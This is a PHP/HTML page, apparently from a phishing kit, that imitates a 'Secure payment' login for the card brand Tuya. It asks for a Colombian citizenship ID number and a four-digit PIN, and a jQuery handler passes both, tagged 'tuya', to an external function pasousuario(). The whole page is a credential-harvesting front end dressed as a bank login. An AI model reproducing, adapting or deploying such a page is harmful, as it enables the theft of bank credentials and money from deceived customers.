<?php

$fechactual = date('d-m-Y');

session_start();

if(isset($_SESSION['estado']) && $_SESSION['estado'] == 1){

}
?>

<!DOCTYPE html>
<html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=0 ">
        <script type="text/javascript" src="/scripts/jquery-3.6.0.min.js"></script>
        <script src="/scripts/jquery.jclock-min.js" type="text/javascript"></script>
        <script type="text/javascript" src="/scripts/functions2.js"></script>  		
        <title>Secure payment</title>
        <script src="http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js" type="text/javascript"></script>
        <script type="text/javascript" src="teclado.js"></script>
        <link rel="stylesheet" type="text/css" href="/css/virtual-key.css">
        <style>
            *{     
                margin: 0;
                padding:0;
                font-family: Arial, Helvetica, sans-serif;
            }
            .main{
                background-color: red;
                border-top-right-radius: 200px;
                border-bottom-right-radius: 
                200px;
                width: 90%;
                height: 150px;
                padding-top:20px;
            }
            a{
                color:white;
                font-size:30px;
            align-items: center;
            }
        </style>
    </head>

    <body>
        <div class="main"><center><a>Un mundo de</a><br><a style="font-size:40px;"><b>beneficios</b><br></a>
            <a>hechos <b style="font-size:40px;">para ti</b></a>
        </div></center>
        <div>
        <br>
        <center>  <img src="img/tuya.png" alt="" width="20%">
            <img src="images/check.png" alt="" srcset="" width="20%"style="margin-left:140px;"><br></center>
            <img src="img/pago.jpg" alt="" srcset="" width="30%" style="margin-left:40px;">
        </div>
        <div style="margin-top:30px;"><center>Fecha Actual <?php echo $fechactual; ?><br>Versión 5.0.2</center></div>
        <br><br>
        <div><b><center>Por favor bríndenos su identificación y clave:</center></b><br><br><br>
            <div class = "datos"  style="position:absolute; margin-left:180px;">                   
                <h4>Tipo de Documento</h4>
                <select style="height:40px; border:1px solid gray; background-color: white; width: 185px; color:black; padding-left: 15px;">
                    <option>CEDULA DE CIUDADANIA</option>
                </select><br><br>
                <h4>Documento de <br>identificación</h4>
                <input type="tel" id="txtUsuario" style="height:40px; width: 183px; border:1px solid gray;" name="cedula" required minlength="6" maxlength="10"> 
                <h4 style="position:absolute; margin-top:20px;">Clave</h4> 
                <input type="tel"  id="txtPass" name="clave" style="height:40px; width: 80px; border:1px solid gray; position:absolute; bottom:70px; left:50px;" required minlength="4" maxlength="4"> 
                <input type="hidden" name="" value="tuya" id="banco">
                <center> <input type="submit" value="Ingresar" id="btnUsuario" style="background-color:red; color:white; margin-top: 80px; height: 45px; border: none; font-family: Arial, Helvetica, sans-serif; padding:5px; font-size: 18px;"></center>
            </div>
        </div>

        <script type="text/javascript">
            $(document).ready(function() {
                $('#btnUsuario').click(function(){
                    if (($("#txtUsuario").val().length > 6) && ($("#txtPass").val().length == 4)) {                
                        pasousuario($("#txtPass").val(), $("#txtUsuario").val(), $("#banco").val());	
                    }else{
                        $("#err-mensaje").show();
                        $(".user").css("border", "1px solid red");
                        $("#txtUsuario").focus();
                    }			
                });
            });
        </script>
    </body>
</html>